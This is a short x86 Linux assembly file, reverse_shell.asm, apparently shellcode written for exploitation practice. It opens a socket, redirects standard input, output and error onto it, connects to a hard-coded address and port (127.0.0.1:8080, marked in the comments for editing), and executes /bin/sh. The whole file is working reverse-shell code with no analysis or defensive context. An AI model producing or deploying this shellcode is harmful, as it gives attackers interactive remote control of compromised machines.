; reverse_shell.asm
; Author: German Namestnikov

global _start

section .text
_start:
    ; int socket(int domain, int type, int protocol);
    xor eax, eax
    xor ebx, ebx
    xor esi, esi

    mov al, 0x66       ; SYS_SOCKETCALL
    inc ebx            ; SYS_SOCKET

    push esi                  ; protocol = 0
    push ebx                  ; type = SOCK_STREAM
    push dword 0x02           ; domain = AF_INET

    mov ecx, esp        ; ecx -> params 

    int 0x80            

    xor ebx, ebx
    xchg ebx, eax        ; save socket descriptor 
    
    ; int dup2(int oldfd, int newfd);
    ; int dup2(accept_descriptor, STDERR/STDOUT/STDIN)
    xor ecx, ecx
   
    pop ecx
    dup2_call:
        mov al, 0x3f
    
        int 0x80    
        dec ecx
        
        jns dup2_call
 
    xchg ebx, edx
    
    ; int connect(int sockfd, const struct sockaddr *addr,
    ;            socklen_t addrlen);
    mov al, 0x66       ; SYS_SOCKETCALL
    mov bl, 0x03       ; SYS_CONNECT
    

    ; struct sockaddr_in {
    push dword 0x0100007f     ; sin_addr = htons(127.0.0.1)    <-- host 
    push word 0x901f    ; sin_port = htons(8080)     <---------- port 
    push word 0x02      ; sin_family = AF_INET
    ; };
    
    mov ecx, esp       	; ecx -> sockaddr_in addr
    
    push dword 0x10     ; addrlen = 16
    push ecx            ; sockaddr_in* addr
    push edx            ; sockfd
    
    mov ecx, esp        ; ecx -> params

    int 0x80


    ; int execve(const char *filename, char *const argv[],
    ;              char *const envp[]);
    xor eax, eax
    
    push eax                    ; NULL-terminator for '/bin//sh'	
    push dword 0x68732f2f	; push "hs//"
    push dword 0x6e69622f	; push "nib/"
   
    mov ebx, esp	; EBX points to the '/bin//sh', 0x00 string 
 
    xor ecx, ecx 	; Set 0 all other params
    xor edx, edx        ; for SYS_EXECVE
    xor esi, esi

    mov al, 0x0b 	; SYS_EXECVE CODE
    int 0x80       

